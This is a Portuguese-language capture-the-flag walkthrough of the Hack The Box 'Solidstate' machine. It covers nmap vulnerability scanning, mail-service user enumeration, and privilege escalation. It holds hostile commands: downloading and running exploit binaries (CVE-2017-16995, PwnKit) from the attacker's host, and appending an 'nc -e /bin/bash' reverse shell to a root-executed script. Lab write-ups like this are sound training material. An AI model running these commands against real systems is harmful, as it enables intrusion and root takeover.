Solidstate
========================

![qownnotes-media-RVyEHc](../../../media/qownnotes-media-RVyEHc.png)

![qownnotes-media-TTlKom](../../../media/qownnotes-media-TTlKom.png)

![qownnotes-media-JJbbQS](../../../media/qownnotes-media-JJbbQS.png)

    sudo nmap -sS --script vuln -n -T5 -Pn solidstate.htb -p 22,25,80,110,119,4555 | tee nmap_vulns.txt

![qownnotes-media-DDnrjU](../../../media/qownnotes-media-DDnrjU.png)

Essa máquina eu já lembrava alguams coisas então ficou um pouco mais fácil, mas vamos lá:

https://www.exploit-db.com/exploits/35513

![qownnotes-media-uaDBuz](../../../media/qownnotes-media-uaDBuz.png)

![qownnotes-media-NSwOSZ](../../../media/qownnotes-media-NSwOSZ.png)

![qownnotes-media-yDIlLk](../../../media/qownnotes-media-yDIlLk.png)


Com o netcat nada funcionava então eu testei com o telnet:


![qownnotes-media-FiRvbv](../../../media/qownnotes-media-FiRvbv.png)

![qownnotes-media-RtdPDM](../../../media/qownnotes-media-RtdPDM.png)

![qownnotes-media-vUSXjY](../../../media/qownnotes-media-vUSXjY.png)

**SMTP Enumeration**

    VRFY root
    VRFY <username>
    
    user <username>
    pass <password>
    list
    
    retr 1
    retr 2


    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
<Ctrl + Z>

    stty raw -echo; fg
    reset

Fiz alguns testes aqui e descobri algumas formas de escalar privilégio. A começar com o método que não funcionou:


    wget http://10.10.14.17/les.sh
    chmod +x les.sh
    ./les.sh
    

    

![qownnotes-media-dgFYPw](../../../media/qownnotes-media-dgFYPw.png)

![qownnotes-media-VGEjEv](../../../media/qownnotes-media-VGEjEv.png)

Na máquina do atacante, eu procurei por logo a primeira opção ques está como probable:

Preciso compilar este código de acordo com a arquitetura x86

    wget https://raw.githubusercontent.com/rlarabee/exploits/master/cve-2017-16995/cve-2017-16995.c
    sudo apt update
    sudo apt install gcc-multilib
    gcc -m32 --static cve-2017-16995.c -o cve-2017-16995
    python -m http.server 80

![qownnotes-media-GZgFqL](../../../media/qownnotes-media-GZgFqL.png)

Na máquina vítima:

    wget http://10.10.14.17/cve-2017-16995 -O c
    chmod +x c
    ./c

![qownnotes-media-AEyzwn](../../../media/qownnotes-media-AEyzwn.png)

Não funcionou, porém com o PwnKit funcionou, mas tem de ser a versão 32 bits:


    wget http://10.10.14.17/PwnKit/PwnKit32 -O p
    chmod +x p
    ./p

Sem novidade

Outra forma de escalar privilégio na máquina é navegando nos diretórios, e no /opt foi onde eu encontrei algo interessante:

    ./pspy64

Coma monitoração de processos, verificamos que o /opt/tmp.py é executado pelo usuário root.

    echo "os.system('nc -e /bin/bash 10.10.14.17 8081')" >> /opt/tmp.py

Só esperar pra vir a shell:

![qownnotes-media-KPNUbn](../../../media/qownnotes-media-KPNUbn.png)

